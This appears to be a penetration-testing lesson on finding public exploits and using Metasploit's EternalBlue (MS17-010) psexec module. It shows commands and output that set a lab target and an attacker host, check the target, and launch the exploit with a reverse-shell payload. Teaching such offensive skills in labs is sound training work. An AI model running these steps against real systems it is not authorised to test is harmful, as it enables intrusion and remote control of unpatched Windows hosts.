# Public Exploits

Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with exploit to see if we get any results.

A well-known tool for this purpose is **searchsploit**, which we can use to search for public vulnerabilities/exploits for any application.

We can also utilize online exploit databases to search for vulnerabilities:

* [Exploit DB](https://www.exploit-db.com)
* [Rapid7 DB](https://www.rapid7.com/db)
* [Vulnerability Lab](https://www.vulnerability-lab.com)

The [Intro to Web Applications](https://academy.hackthebox.com/module/details/75) module discusses public vulnerabilities for web applications.

## Metasploit

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets.

    $ msfconsole

Once we have Metasploit running, we can search for our target application with the search exploit command. For example, we can search for an SMB vulnerability.

    msf6 > search exploit eternalblue

We found one exploit for this service. We can use it by copying the full name of it and using USE to use it

    msf6 > use exploit/windows/smb/ms17_010_psexec

    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the **show options** command.

    ...SNIP...

Any option with **Required** set to **yes** needs to be set for the exploit to work. In this case, we only have two options to set: **RHOSTS**, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). The second option, **LHOST**, represents the IP of our attack host (this can be a single IP, or the name of a network interface. In the example below, **LHOST** is being set to the IP associated with our **tun0** interface.) We can set them with the set command.

    msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
    RHOSTS => 10.10.10.40
    msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
    LHOST => tun0

We can run a check to ensure the server is vulnerable.

    msf6 exploit(windows/smb/ms17_010_psexec) > check

    [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
    [+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
    [*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
    [+] 10.10.10.40:445 - The target is vulnerable.

Note that not every exploit in the Metasploit Framework supports the check function. Finally, we can use the run or exploit command to run the exploit.

    msf6 exploit(windows/smb/ms17_010_psexec) > exploit
